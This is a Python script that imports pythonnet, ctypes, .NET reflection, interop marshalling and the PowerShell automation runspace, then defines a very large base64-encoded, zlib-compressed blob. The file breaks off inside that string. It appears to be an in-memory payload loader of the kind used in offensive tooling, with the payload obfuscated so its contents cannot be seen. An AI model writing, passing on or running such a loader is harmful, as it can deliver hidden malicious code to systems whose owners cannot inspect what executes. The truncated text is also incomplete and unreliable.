import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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